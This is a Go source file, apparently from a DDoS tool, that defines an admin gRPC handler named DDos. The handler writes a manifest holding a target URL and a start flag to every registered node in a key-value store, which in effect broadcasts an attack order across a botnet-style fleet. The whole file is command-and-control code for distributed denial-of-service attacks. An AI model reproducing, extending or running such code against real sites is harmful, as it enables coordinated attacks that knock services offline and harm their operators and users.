package admin

import (
	"context"
	"fmt"

	"github.com/murtaza-u/ddos/manifest"
	pb "github.com/murtaza-u/ddos/proto/gen/go/admin"
	"github.com/murtaza-u/ddos/types"

	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
)

func (a *AdminSrv) DDos(ctx context.Context, in *pb.Params) (*pb.Void, error) {
	ids, err := idsFromStore(a.Store)
	if err != nil {
		return nil, err
	}

	for _, id := range ids {
		k := fmt.Sprintf("/registry/%s/ddos", id)
		m := manifest.NewDDoSManifest()

		byts, _, err := a.Store.Get(k)
		if err != nil {
			m.Spec.Url = in.GetUrl()
			m.Spec.Start = in.GetStart()

			byts, err = manifest.Marshal(m)
			if err != nil {
				return nil, grpc.Errorf(codes.Internal,
					types.ErrMarshaling.Error())
			}

			_, err := a.Store.Put(k, byts)
			if err != nil {
				return nil, grpc.Errorf(codes.Internal, err.Error())
			}

			continue
		}

		err = manifest.Unmarshal(byts, m)
		if err != nil {
			return nil, grpc.Errorf(codes.Internal,
				types.ErrUnmarshaling.Error())
		}
		m.Spec.Url = in.GetUrl()
		m.Spec.Start = in.GetStart()

		byts, err = manifest.Marshal(m)
		if err != nil {
			return nil, grpc.Errorf(codes.Internal,
				types.ErrMarshaling.Error())
		}

		_, err = a.Store.Put(k, byts)
		if err != nil {
			return nil, grpc.Errorf(codes.Internal, err.Error())
		}
	}

	return &pb.Void{}, nil
}
